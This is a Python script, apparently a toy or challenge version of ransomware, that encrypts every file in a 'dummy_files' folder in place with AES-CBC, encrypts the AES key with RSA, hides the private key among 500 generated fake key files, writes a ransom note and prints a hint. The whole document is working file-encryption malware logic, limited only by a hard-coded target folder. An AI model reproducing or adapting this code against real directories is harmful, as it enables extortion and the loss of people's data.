import os
import random
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding as asymmetric_padding

def generate_aes_key(size=256):
    return os.urandom(size // 8)

def encrypt_file_in_place(file_path, aes_key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    encryptor = cipher.encryptor()

    with open(file_path, 'rb') as file:
        data = file.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(iv + encrypted_data)

def generate_rsa_keypair():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    return private_key, public_key

def encrypt_aes_key(aes_key, public_key):
    return public_key.encrypt(
        aes_key,
        asymmetric_padding.OAEP(
            mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def hide_private_key(private_key):
    os.makedirs("good_luck_finding_the_key", exist_ok=True)
    
    # Generate hundreds of fake key files
    for i in range(1, 501):
        fake_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        with open(f"good_luck_finding_the_key/fake_key_{i}.pem", 'wb') as fake_key_file:
            fake_key_file.write(fake_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))

    # Save the actual private key hidden among fake keys
    hidden_file = random.choice([f"good_luck_finding_the_key/fake_key_{i}.pem" for i in range(1, 501)])
    with open(hidden_file, 'wb') as private_key_file:
        private_key_file.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))

    return hidden_file

def create_ransom_note(encrypted_aes_key):
    ransom_note = f"Your files have been encrypted. To decrypt them, use the provided decryption key hidden among the fake keys: {encrypted_aes_key.hex()}"
    with open('ransom_note.txt', 'w') as ransom_note_file:
        ransom_note_file.write(ransom_note)

def give_hint(hidden_file):
    hint = f"Hint: The real key might be near a file named '{os.path.basename(hidden_file)[-10:]}'"
    print(hint)

def main():
    private_key, public_key = generate_rsa_keypair()
    aes_key = generate_aes_key()

    for file in os.listdir('dummy_files'):
        file_path = os.path.join('dummy_files', file)
        encrypt_file_in_place(file_path, aes_key)

    encrypted_aes_key = encrypt_aes_key(aes_key, public_key)
    create_ransom_note(encrypted_aes_key)
    
    hidden_file = hide_private_key(private_key)
    give_hint(hidden_file)

    print("Files encrypted. Private key is hidden in 'good_luck_finding_the_key' folder. Good luck finding it!")

if __name__ == '__main__':
    main()
